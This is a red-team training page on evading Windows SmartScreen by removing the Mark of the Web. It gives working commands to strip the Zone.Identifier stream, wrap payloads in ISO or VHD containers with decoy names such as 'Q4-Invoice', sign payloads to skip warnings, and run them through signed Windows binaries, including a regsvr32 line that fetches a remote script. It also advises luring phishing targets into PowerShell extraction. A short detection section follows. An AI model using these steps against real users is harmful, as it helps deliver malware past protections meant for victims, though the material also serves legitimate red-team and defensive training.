---
layout: training-page
title: "SmartScreen & MOTW Bypass — Red Team Academy"
module: "Evasion"
tags:
  - smartscreen
  - motw
  - zone-identifier
  - iso-delivery
  - packmypayload
  - t1553.005
page_key: "evasion-smartscreen-motw"
render_with_liquid: false
---

# SmartScreen & MOTW Bypass

Mark of the Web (MOTW) is a Zone.Identifier alternate data stream (ADS) Windows applies to files downloaded from the internet. SmartScreen uses MOTW to trigger reputation checks and user warnings when a marked file is executed. Removing MOTW — or delivering payloads via containers that don't propagate it — bypasses these controls without touching the payload itself.

MITRE ATT&CK: **T1553.005** — Subvert Trust Controls: Mark of the Web

---

## What Is Mark of the Web?

MOTW is implemented as an NTFS Alternate Data Stream named `Zone.Identifier`, attached to files by browsers and email clients when they save downloaded content:

```
Zone.Identifier contents:
[ZoneTransfer]
ZoneId=3
ReferrerUrl=https://attacker.com/
HostUrl=https://attacker.com/payload.exe
```

Zone IDs:
- `0` — Local Machine (no restriction)
- `1` — Local Intranet
- `2` — Trusted Sites
- `3` — Internet (triggers SmartScreen)
- `4` — Restricted Sites

---

## Inspecting MOTW

```powershell
# Check if a file has MOTW
Get-Item "invoice.exe" -Stream *
Get-Content -Path "invoice.exe" -Stream "Zone.Identifier"

# Command prompt
more < invoice.exe:Zone.Identifier
```

---

## Removing MOTW Manually

```powershell
# PowerShell — remove Zone.Identifier ADS
Remove-Item -Path "invoice.exe" -Stream "Zone.Identifier"

# Unblock-File wrapper
Unblock-File -Path "invoice.exe"

# Sysinternals Streams (all ADS)
streams.exe -d invoice.exe

# attrib (Windows built-in, requires elevation sometimes)
# Right-click → Properties → Unblock checkbox = same as Unblock-File
```

---

## Delivery via ISO / VHD (Most Reliable)

Mounting an ISO or VHD does **not** propagate MOTW to the files inside on Windows 10/11. The container itself gets MOTW, but extracted contents do not inherit it — meaning payload.exe inside the ISO has no Zone.Identifier when the user opens it.

### Manual ISO Creation (isoburn/oscdimg)

```powershell
# Create a simple ISO with oscdimg (Windows ADK)
# Stage files in a directory first
New-Item -ItemType Directory -Path C:\staging
Copy-Item payload.exe C:\staging\invoice.exe

# Build ISO
oscdimg -n -m C:\staging\ output.iso
```

### PackMyPayload (Automated ISO/VHD/ZIP Wrapping)

PackMyPayload automates packing payloads into various container formats that strip MOTW:

```bash
# Install
pip3 install packmypayload

# Pack into ISO (most common, strips MOTW)
python PackMyPayload.py payload.exe payload.iso

# Pack into VHD (virtual hard disk — also strips MOTW)
python PackMyPayload.py payload.exe payload.vhd

# Pack multiple files
python PackMyPayload.py payload.exe lure.pdf payload.iso

# Pack with a decoy folder name
python PackMyPayload.py -i payload.exe -o payload.iso --isoname "Q4-Invoice"
```

When the target mounts the ISO (double-click on Win10/11) and runs `invoice.exe`, no MOTW is present — SmartScreen does not prompt.

### Supported Container Formats

| Format | MOTW Propagation | Notes |
|--------|-----------------|-------|
| `.iso` | None (files inside clean) | Most reliable on Win10/11 |
| `.vhd` / `.vhdx` | None | Same as ISO |
| `.zip` (PowerShell `Expand-Archive`) | None | `Expand-Archive` drops MOTW |
| `.zip` (Explorer extract) | Propagates | Explorer preserves MOTW |
| `.7z` / `.rar` | Depends on tool | Most third-party tools drop it |
| `.cab` | None | Windows built-in extraction |

---

## Zone.Identifier via PowerShell Expand-Archive

If delivering a ZIP (not ISO), `Expand-Archive` in PowerShell strips MOTW from extracted files — while right-click Extract in Explorer preserves it:

```powershell
# Recipient receives payload.zip with Zone.Identifier ZoneId=3
# If they extract with Expand-Archive:
Expand-Archive -Path payload.zip -DestinationPath C:\Temp\
# → payload.exe inside has NO Zone.Identifier

# If they right-click → Extract All:
# → payload.exe has Zone.Identifier ZoneId=3 (SmartScreen fires)
```

In phishing scenarios, instruct the target to "extract with PowerShell" or simply double-click the ISO.

---

## SmartScreen Bypasses (Additional)

### Signed Binary (Most Effective)

SmartScreen reputation is hash-based and reputation-based. A valid Authenticode signature from a trusted CA with established reputation bypasses the prompt entirely:

```powershell
# Check signature status
Get-AuthenticodeSignature payload.exe

# Sign with a purchased code-signing cert
signtool sign /fd SHA256 /n "Your Company" payload.exe
```

New EV code-signing certificates immediately bypass SmartScreen warnings.

### Catalog Signing

Windows catalog files (`.cat`) can vouch for unsigned binaries. Rarely used offensively.

### LOLBins for Initial Execution

Execute the payload via a signed Windows binary that SmartScreen doesn't check:

```powershell
# mshta.exe — executes .hta, bypasses SmartScreen for the .hta content
mshta.exe payload.hta

# rundll32 — executes DLL exports
rundll32.exe payload.dll,EntryPoint

# regsvr32 — COM registration, can execute remote SCT
regsvr32.exe /s /n /u /i:http://server/payload.sct scrobj.dll

# wscript / cscript — execute VBScript/JScript
wscript.exe payload.vbs
```

---

## Detection

| Signal | Source |
|--------|--------|
| ISO/VHD mounted from Internet-zone file | File system + Sysmon EventID 6 (driver load) |
| ISO/VHD containing executable files | Endpoint AV scan of container |
| File executed without Zone.Identifier (from known-internet source) | EDR file execution telemetry |
| `Unblock-File` / `Remove-Item -Stream Zone.Identifier` called | PowerShell ScriptBlock log |
| `streams.exe -d` execution | Process creation |

### MOTW Enforcement (Windows 11 Update)

Microsoft released updates (2022-2023) that improve MOTW propagation for ISO, VHD, and some archive formats. Modern Windows 11 + fully patched = some of these bypasses are closed. Always test against the target patch level.

```powershell
# Check Windows version and patch level
Get-ComputerInfo | Select WindowsVersion, OsHardwareAbstractionLayer
```

---

## Resources

- MITRE ATT&CK T1553.005 — Mark of the Web — `attack.mitre.org/techniques/T1553/005/`
- PackMyPayload — `github.com/mgeeky/PackMyPayload`
- MOTW Propagation Research (Outflank) — `outflank.nl/blog/2020/03/30/mark-of-the-web-from-a-red-teams-perspective/`
- Microsoft MOTW enforcement update (KB5009543) — `support.microsoft.com/kb/5009543`
- SmartScreen bypass techniques — `redteam.cafe/red-team/windows-based-evasion/bypassing-smartscreen`
